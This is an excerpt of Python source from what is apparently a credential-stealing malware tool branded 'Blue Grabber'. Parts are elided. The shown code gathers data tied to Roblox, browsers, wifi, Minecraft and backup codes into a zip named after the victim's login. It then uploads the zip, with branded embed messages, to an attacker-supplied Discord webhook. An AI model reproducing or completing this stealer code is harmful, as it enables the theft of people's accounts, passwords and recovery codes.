...
def main(webhook: str):
    ...
    data = {
        "username": "Blue",
        "avatar_url": "https://cdn.discordapp.com/icons/1164660169515487252/a_6f96d8cfa398f69e1adb1ea2c65337d7.gif?size=4096"
    }

    _file = f'{localappdata}\\Blue-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Blue-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Blue-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Blue Grabber | Created By Droxzy"
                    },
                    "thumbnail": {
                        "url": "https://cdn.discordapp.com/icons/1164660169515487252/a_6f96d8cfa398f69e1adb1ea2c65337d7.gif?size=4096"
                    }
                }
            ],
            "username": "Blue",
